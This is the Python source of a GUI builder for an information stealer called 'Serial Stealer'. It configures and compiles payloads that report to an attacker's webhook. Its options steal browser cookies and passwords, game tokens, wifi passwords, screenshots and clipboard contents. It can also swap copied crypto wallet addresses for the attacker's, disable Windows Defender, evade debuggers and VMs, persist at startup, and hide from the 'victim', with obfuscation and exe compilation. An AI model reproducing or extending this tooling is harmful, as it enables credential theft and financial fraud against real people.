import customtkinter
from customtkinter import filedialog as fd
import os
from PIL import Image
import requests
import time
import shutil
import webbrowser
import win32gui
import win32con

#############################################################################################################################
############################################ Clean@Builder: v8 ##############################################################
############################################ Clean@Author: https://github.com/blackkface ####################################
############################################ Clean@Code: For serial #########################################################
#############################################################################################################################

class serial(customtkinter.CTk):
    def __init__(self):
        self.icon_name = ""
        self.pingtype = "none"
        
        self.iconname = "Serial_assets\img\serial.ico"
        super().__init__()

        #title, icon
        self.title("Serial - Builder")
        self.geometry("840x600")
        self.iconbitmap("Serial_assets\img\logo.ico")

        #base
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        #path img
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "serial_assets\img")
        self.logo = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(60, 60))
        self.gif = customtkinter.CTkImage(Image.open(os.path.join(image_path, "serial.png")), size=(300, 300))
        self.options = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "options.png")), dark_image=Image.open(os.path.join(image_path, "options.png")), size=(20, 20))
        self.crypto = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "crypto.png")), dark_image=Image.open(os.path.join(image_path, "crypto.png")), size=(20, 20))
        self.files = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "files.png")), dark_image=Image.open(os.path.join(image_path, "files.png")), size=(20, 20))
        self.build_img = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "build.png")),dark_image=Image.open(os.path.join(image_path, "build.png")), size=(20, 20))
        self.about = customtkinter.CTkImage(light_image=Image.open(os.path.join(image_path, "about.png")), dark_image=Image.open(os.path.join(image_path, "about.png")), size=(20, 20))


        #List Frame
        self.options_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.options_frame.grid_columnconfigure(0, weight=1)

        self.nav_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.nav_frame.grid(row=0, column=0, sticky="nsew")

        self.crypto_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.crypto_frame.grid_columnconfigure(0, weight=1)

        self.build_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.build_frame.grid_columnconfigure(0, weight=1)

        self.file_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.file_frame.grid_columnconfigure(0, weight=1)

        self.about_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)


        #Nav Bar
        self.nav_frame.grid_rowconfigure(6, weight=1)
        self.nav_label = customtkinter.CTkLabel(self.nav_frame, text="", image=self.logo, compound="left", font=customtkinter.CTkFont(size=60, weight="bold"))
        self.nav_label.grid(row=0, column=0, padx=20, pady=20)

        self.option_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="Options", fg_color="transparent", text_color=("gray10", "gray90"), hover_color="#00ff91", image=self.options, anchor="w", command=self.option_event)
        self.option_button.grid(row=1, pady=20, column=0, sticky="ew")

        self.crypto_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="Crypto", fg_color="transparent", text_color=("gray10", "gray90"), hover_color="#00ff91", image=self.crypto, anchor="w", command=self.crypto_event)
        self.crypto_button.grid(row=2, pady=20, column=0, sticky="ew")

        self.file_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40, border_spacing=10, text="File", fg_color="transparent", text_color=("gray10", "gray90"), hover_color="#00ff91", image=self.files, anchor="w", command=self.file_event)
        self.file_button.grid(row=3, pady=20, column=0, sticky="ew")

        self.build_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40,border_spacing=10, text="Build", fg_color="transparent",text_color=("gray10", "gray90"), hover_color="#00ff91",image=self.build_img, anchor="w", command=self.build_event)
        self.build_button.grid(row=4, pady=20, column=0, sticky="ew")

        self.about_button = customtkinter.CTkButton(self.nav_frame, corner_radius=0, height=40,border_spacing=10, text="About", fg_color="transparent",text_color=("gray10", "gray90"), hover_color="#00ff91",image=self.about, anchor="w",command=self.about_event)
        self.about_button.grid(row=5, pady=20, column=0, sticky="ew")


        #Options category
        self.w3bh00k_input = customtkinter.CTkEntry(self.options_frame, width=400, placeholder_text="Enter your webhook")
        self.w3bh00k_input.grid(row=1, column=0, columnspan=2, padx=40, pady=15)

        self.w3bh00k_button = customtkinter.CTkButton(self.options_frame, width=120, height=30, fg_color=("gray75", "gray25"), hover_color="#00ff91", text="Check Webhook", command=self.c_button, compound="right")
        self.w3bh00k_button.grid(row=1, column=2, padx=40, pady=15)

        self.n3m3_input = customtkinter.CTkEntry(self.options_frame, width=400, placeholder_text="Enter your file output name")
        self.n3m3_input.grid(row=2, column=0, columnspan=2, padx=40, pady=15)

        self.icon_button = customtkinter.CTkButton(self.options_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#00ff91",text="Add Icon (.ico)", command=self.icon, compound="right")
        self.icon_button.grid(row=3, column=2, padx=40, pady=15)

        self.icon_check = customtkinter.CTkCheckBox(self.options_frame, text="Add icon on your exe [.ico only]",fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue="yes",offvalue="no")
        self.icon_check.grid(row=3, column=0, sticky="nw", padx=40, pady=15)

        self.kill = customtkinter.CTkCheckBox(self.options_frame, text="Kill victim Discord Client", fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue=True, offvalue=False)
        self.kill.grid(row=4, column=0, sticky="nw", padx=40, pady=15)

        self.dbug = customtkinter.CTkCheckBox(self.options_frame, text="Enable Anti-Debug \n[Recommand yes, Kill Anti-Virus/Anti-Firewall/Anti-VM]?",fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue=True, offvalue=False)
        self.dbug.grid(row=5, column=0, sticky="nw", padx=40, pady=15)

        self.ping_new = customtkinter.CTkCheckBox(self.options_frame,text="Ping on new victim? (here/everyone)",fg_color=("gray75", "gray25"), hover_color="#00ff91",command=self.pings, onvalue="yes", offvalue="no")
        self.ping_new.grid(row=6, column=0, sticky="nw", padx=40, pady=15)

        self.ping_option = customtkinter.CTkComboBox(self.options_frame,values=["here", "everyone"])
        self.ping_option.grid(row=6, column=2, sticky="nw", padx=40, pady=15)

        self.wd = customtkinter.CTkCheckBox(self.options_frame, text="Disable Windows Defender \n(Can create error/detection Recommand \"no active\")",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.wd.grid(row=7, column=0, sticky="nw", padx=40, pady=15)

        self.fake_err = customtkinter.CTkCheckBox(self.options_frame,text="Add a fake error",fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue='yes', offvalue='no')
        self.fake_err.grid(row=8, column=0, sticky="nw", padx=40, pady=15)

        self.startups = customtkinter.CTkCheckBox(self.options_frame, text="Add file to startup",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.startups.grid(row=9, column=0, sticky="nw", padx=40, pady=15)

        self.hide = customtkinter.CTkCheckBox(self.options_frame, text="Hide serial console for victim",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.hide.grid(row=10, column=0, sticky="nw", padx=40, pady=15)

        # Next button
        self.next_option_button = customtkinter.CTkButton(self.options_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#00ff91",text="Next", command=self.crypto_event, compound="right")
        self.next_option_button.grid(row=10, column=2, padx=40, pady=15)


        #Crypto category
        self.active = customtkinter.CTkCheckBox(self.crypto_frame, text="Replace all copied crypto address wallet by your address",fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue='yes', offvalue='no')
        self.active.grid(row=1, column=0, sticky="nw", padx=40, pady=10)

        self.btc_name = customtkinter.CTkLabel(master=self.crypto_frame, text="Bitcoin")
        self.btc_name.grid(row=2, column=0, columnspan=2, padx=10, pady=0)

        self.btc_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your Bitcoin Address (let empty if you do not have)")
        self.btc_input.grid(row=3, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.eth_name = customtkinter.CTkLabel(master=self.crypto_frame, text="Ethereum")
        self.eth_name.grid(row=4, column=0, columnspan=2, padx=10, pady=0)

        self.eth_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your Ethereum Address (let empty if you do not have)")
        self.eth_input.grid(row=5, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.xchain_name = customtkinter.CTkLabel(master=self.crypto_frame, text="X-Chain")
        self.xchain_name.grid(row=6, column=0, columnspan=2, padx=10, pady=0)

        self.xchain_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your X-Chain Address (let empty if you do not have)")
        self.xchain_input.grid(row=7, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.pchain_name = customtkinter.CTkLabel(master=self.crypto_frame, text="P-Chain")
        self.pchain_name.grid(row=8, column=0, columnspan=2, padx=10, pady=0)

        self.pchain_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your P-Chain Address (let empty if you do not have)")
        self.pchain_input.grid(row=9, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.cchain_name = customtkinter.CTkLabel(master=self.crypto_frame, text="C-Chain")
        self.cchain_name.grid(row=10, column=0, columnspan=2, padx=10, pady=0)

        self.cchain_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your C-Chain Address (let empty if you do not have)")
        self.cchain_input.grid(row=11, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.monero_name = customtkinter.CTkLabel(master=self.crypto_frame, text="Monero")
        self.monero_name.grid(row=12, column=0, columnspan=2, padx=10, pady=0)

        self.monero_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your Monero Address (let empty if you do not have)")
        self.monero_input.grid(row=13, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.ada_name = customtkinter.CTkLabel(master=self.crypto_frame, text="Ada/Cardano")
        self.ada_name.grid(row=14, column=0, columnspan=2, padx=10, pady=0)

        self.ada_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your Ada/Cardano Address (let empty if you do not have)")
        self.ada_input.grid(row=15, column=0, columnspan=2, padx=40, pady=(0, 10))

        self.dash_name = customtkinter.CTkLabel(master=self.crypto_frame, text="Dash")
        self.dash_name.grid(row=16, column=0, columnspan=2, padx=10, pady=0)

        self.dash_input = customtkinter.CTkEntry(self.crypto_frame, width=400,placeholder_text="Your Dash Address (let empty if you do not have)")
        self.dash_input.grid(row=17, column=0, columnspan=2, padx=40, pady=(0, 10))

        #Next button
        self.next_crypto_button = customtkinter.CTkButton(self.crypto_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#00ff91",text="Next", command=self.file_event, compound="right")
        self.next_crypto_button.grid(row=17, column=2, padx=40, pady=0)


        #File category
        self.browsers_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal Browsers Files (Cookies/Password/etc...)",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.browsers_button.grid(row=1, column=0, sticky="nw", padx=40, pady=20)

        self.antivirus_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal all anti virus informations",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.antivirus_button.grid(row=2, column=0, sticky="nw", padx=40, pady=20)

        self.mc_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all minecraft app tokens",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.mc_button.grid(row=3, column=0, sticky="nw", padx=40, pady=20)

        self.sys_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal systeme informations",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.sys_button.grid(row=4, column=0, sticky="nw", padx=40, pady=20)

        self.roblox_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal roblox app token",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.roblox_button.grid(row=5, column=0, sticky="nw", padx=40, pady=20)

        self.screen_button = customtkinter.CTkCheckBox(self.file_frame, text="Take screenshot",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.screen_button.grid(row=6, column=0, sticky="nw", padx=40, pady=20)

        self.last_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal latest clipboard",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.last_button.grid(row=7, column=0, sticky="nw", padx=40, pady=20)

        self.wifi_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all wifi passwords",fg_color=("gray75", "gray25"), hover_color="#00ff91",onvalue='yes', offvalue='no')
        self.wifi_button.grid(row=8, column=0, sticky="nw", padx=40, pady=20)

        #Next button
        self.next_file_button = customtkinter.CTkButton(self.file_frame, width=120, height=30,fg_color=("gray75", "gray25"), hover_color="#00ff91",text="Next", command=self.build_event, compound="right")
        self.next_file_button.grid(row=9, column=2, padx=40, pady=20)

        #Select button defaut
        self.browsers_button.select()
        self.antivirus_button.select()
        self.mc_button.select()
        self.sys_button.select()
        self.roblox_button.select()
        self.screen_button.select()
        self.last_button.select()
        self.wifi_button.select()


        #Build category
        self.obf = customtkinter.CTkCheckBox(self.build_frame, text="Obfuscate the serial",fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue='yes', offvalue='no')
        self.obf.grid(row=1, column=0, sticky="nw", padx=40, pady=20)

        self.compy = customtkinter.CTkCheckBox(self.build_frame,text="Compil into .exe (Let Empty for .py)",fg_color=("gray75", "gray25"), hover_color="#00ff91", onvalue='yes', offvalue='no')
        self.compy.grid(row=2, column=0, sticky="nw", padx=40, pady=20)

        self.obf_name = customtkinter.CTkLabel(master=self.build_frame, text="Obfuscation Level")
        self.obf_name.grid(row=3, column=0, columnspan=2, padx=10, pady=(20, 0))

        self.obf_bar = customtkinter.CTkSlider(self.build_frame, from_=0, to=1, number_of_steps=4)
        self.obf_bar.grid(row=4, column=0, sticky="ew", padx=40, pady=20)

        self.pleasebuild = customtkinter.CTkButton(self.build_frame, width=150, height=50,fg_color=("gray75", "gray25"), hover_color="#00ff91", text="BUILD SCRIPT", command=lambda: self.build_scr(self.n3m3_input.get(), self.w3bh00k_input.get()), compound="right")
        self.pleasebuild.grid(row=5, column=0, padx=0, pady=20)


        #About category
        self.img = customtkinter.CTkLabel(self.about_frame, text="", image=self.gif, compound="left",font=customtkinter.CTkFont(size=16, weight="bold"))
        self.img.grid(row=0, column=0, padx=0, pady=20)

        self.github_button = customtkinter.CTkButton(self.about_frame, text="Github", fg_color=("gray75", "gray25"), hover_color="#00ff91", command=lambda: webbrowser.open("https://github.com/blackkface/Serial-Stealer"))
        self.github_button.grid(row=3, column=0, padx=0, pady=10)

        self.discord_button = customtkinter.CTkButton(self.about_frame, text="Discord", fg_color=("gray75", "gray25"), hover_color="#00ff91", command=lambda: webbrowser.open("https://discord.gg/4bu23zEdkx"))
        self.discord_button.grid(row=4, column=0, padx=0, pady=10)

        self.tg_button = customtkinter.CTkButton(self.about_frame, text="Telegram", fg_color=("gray75", "gray25"), hover_color="#00ff91", command=lambda: webbrowser.open("Pas encore fait !"))
        self.tg_button.grid(row=5, column=0, padx=0, pady=10)


        self.function("options")

    # Nav bar
    def function(self, name):
        self.option_button.configure(fg_color=("gray75", "gray25") if name == "option" else "transparent")
        self.crypto_button.configure(fg_color=("gray75", "gray25") if name == "crypto" else "transparent")
        self.file_button.configure(fg_color=("gray75", "gray25") if name == "file" else "transparent")
        self.build_button.configure(fg_color=("gray75", "gray25") if name == "build" else "transparent")
        self.about_button.configure(fg_color=("gray75", "gray25") if name == "about" else "transparent")

        if name == "options":
            self.options_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.options_frame.grid_forget()
        if name == "crypto":
            self.crypto_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.crypto_frame.grid_forget()
        if name == "file":
            self.file_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.file_frame.grid_forget()
        if name == "build":
            self.build_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.build_frame.grid_forget()
        if name == "about":
            self.about_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.about_frame.grid_forget()

    #Options category
    def r_icon(self):
        self.icon_button.configure(fg_color=("gray75", "gray25"), hover_color="#00ff91", text="Add Icon (.ico)")

    def icon(self):
        self.icon_name = fd.askopenfilename()
        self.name_icon = os.path.basename(self.icon_name)
        if os.path.isfile(f"{self.icon_name}"):
            self.icon_button.configure(width=120, height=30, fg_color="green", hover_color=("gray75", "gray25"),text=f"{self.name_icon}")
            self.options_frame.after(3500, self.r_icon)
            pass
        else:
            self.icon_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"),text="Invalid directory")
            self.options_frame.after(3500, self.r_icon)
        if self.icon_name.endswith('.ico'):
            pass
        else:
            self.icon_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"),text="Invalid extention")
            self.options_frame.after(3500, self.r_icon)


    def v_w3bh00k(self):
        webhook = self.w3bh00k_input.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def c_button(self):
        if self.v_w3bh00k():
            self.w3bh00k_button.configure(width=120, height=30, fg_color="green", hover_color=("gray75", "gray25"), text="Valid Webhook")
            self.options_frame.after(3500, self.r_button)
        else:
            self.w3bh00k_button.configure(width=120, height=30, fg_color="red", hover_color=("gray75", "gray25"), text="Invalid Webhook")
            self.options_frame.after(3500, self.r_button)

    def r_button(self):
        self.w3bh00k_button.configure(fg_color=("gray75", "gray25"), hover_color="#00ff91", text="Check Webhook")

    def pings(self):
        if self.ping_new.get() == "yes":
            self.ping = "yes"
            self.pingtype = self.ping_option.get()
        else:
            self.ping = "no"
            self.pingtype = "none"

    #Nav Bar
    def option_event(self):
        self.function("options")

    def crypto_event(self):
        self.function("crypto")

    def build_event(self):
        self.function("build")

    def file_event(self):
        self.function("file")

    def about_event(self):
        self.function("about")

    def reset_build(self):
        self.pleasebuild.configure(fg_color=("gray75", "gray25"), text="BUILD SCRIPT")


##BUILDER USING
    def build_scr(self, filename, webhook):
        self.pleasebuild.configure(width=150, height=50, fg_color="green", hover_color=("gray75", "gray25"),text="Build currently starting")
        self.options_frame.after(5000, self.reset_build)
        self.mk_file(filename, webhook)
        self.cleanup(filename)
        self.renamefile(filename)


    def mk_file(self, filename,webhook):
        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()


        if self.active.get() == "yes":
            if len(self.btc_input.get())==0:
                self.btc_ = 'none'
            else:
                self.btc_ = self.btc_input.get()

            if len(self.eth_input.get())==0:
                self.eth_ = 'none'
            else:
                self.eth_ = self.eth_input.get()

            if len(self.xchain_input.get())==0:
                self.xchain_ = 'none'
            else:
                self.xchain_ = self.xchain_input.get()

            if len(self.pchain_input.get())==0:
                self.pchain_ = 'none'
            else:
                self.pchain_ = self.pchain_input.get()

            if len(self.cchain_input.get())==0:
                self.cchain_ = 'none'
            else:
                self.cchain_ = self.cchain_input.get()

            if len(self.monero_input.get())==0:
                self.monero_ = 'none'
            else:
                self.monero_ = self.monero_input.get()

            if len(self.ada_input.get())==0:
                self.ada_ = 'none'
            else:
                self.ada_ = self.ada_input.get()

            if len(self.dash_input.get())==0:
                self.dash_ = 'none'
            else:
                self.dash_ = self.dash_input.get()
        else:
            self.btc_ = ''
            self.eth_ = ''
            self.xchain_ = ''
            self.pchain_ = ''
            self.cchain_ = ''
            self.monero_ = ''
            self.ada_ = ''
            self.dash_ = ''


        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%WEBHOOK_HERE%', webhook)
                    .replace("%ping_enabled%", str(self.ping_new.get()))
                    .replace("%Defender_disable%", str(self.wd.get()))
                    .replace("%ping_type%", self.pingtype)
                    .replace("%_address_replacer%", str(self.active.get()))
                    .replace("%_btc_address%", self.btc_)
                    .replace("%_eth_address%", self.eth_)
                    .replace("%_xchain_address%", self.xchain_)
                    .replace("%_pchain_address%", self.pchain_)
                    .replace("%_cchain_address%", self.cchain_)
                    .replace("%_monero_address%", self.monero_)
                    .replace("%_ada_address%", self.ada_)
                    .replace("%_dash_address%", self.dash_)
                    .replace("%_error_enabled%", str(self.fake_err.get()))
                    .replace("%_startup_enabled%", str(self.startups.get()))
                    .replace("%_hide_script%", str(self.hide.get()))
                    .replace("'%kill_discord_process%'", str(self.kill.get()))
                    .replace("'%_debugkiller%'", str(self.dbug.get()))
                    .replace("%_browsers_files%", str(self.browsers_button.get()))
                    .replace("%_av_files%", str(self.antivirus_button.get()))
                    .replace("%minecraft_files%", str(self.mc_button.get()))
                    .replace("%_systeme_files%", str(self.sys_button.get()))
                    .replace("%_roblox_files%", str(self.roblox_button.get()))
                    .replace("%_clipboard_files%", str(self.last_button.get()))
                    .replace("%_screen_files%", str(self.screen_button.get()))
                    .replace("%wifipassword_files%", str(self.wifi_button.get())))


        time.sleep(2)
        if self.obf.get() == 'yes' and self.compy.get() == 'yes':
            self.encryption(f"{filename}")
            self.compile(f"obfuscated_{filename}")
        elif self.obf.get() == 'no' and self.compy.get() == 'yes':
            self.compile(f"{filename}")
        elif self.obf.get() == 'yes' and self.compy.get() == 'no':
            self.encryption(f"{filename}")
        else:
            pass

    def encryption(self, filename):
        os.system(f"python obfuscation.py -i {filename}.py -o obfuscated_{filename}.py -s {self.obf_bar.get() * 100}".replace(".0", ""))

    def compile(self, filename):
        if self.icon_check.get() == 'yes':
            if self.icon_name != "":
                icon = self.icon_name
            else:
                icon = self.iconname
    
        else:
            icon = "NONE"
        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./serial_assets/upx -i {icon} --distpath ./ .\\{filename}.py')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py',f'./{filename}.spec',f'./obfuscated_compressed_{filename}.py',f'./obfuscated_{filename}.py',f'./obfuscated_{filename}.spec',f'./compressed_{filename}.py',f'./compressed_{filename}.spec'}

        if self.obf.get() == 'yes' and self.compy.get() == 'no':

            cleans_file.add(f'./{filename}.py')
            cleans_file.remove(f'./obfuscated_compressed_{filename}.py')
        elif self.obf.get() == 'yes' and self.compy.get() == 'yes':
            cleans_file.add(f'./{filename}.py')
            cleans_file.add(f'./obfuscated_compressed_{filename}.spec')
        elif self.obf.get() == 'no' and self.compy.get() == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    def renamefile(self, filename):
        try:
            os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

if __name__ == "__main__":
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)
    app = serial()
    app.mainloop()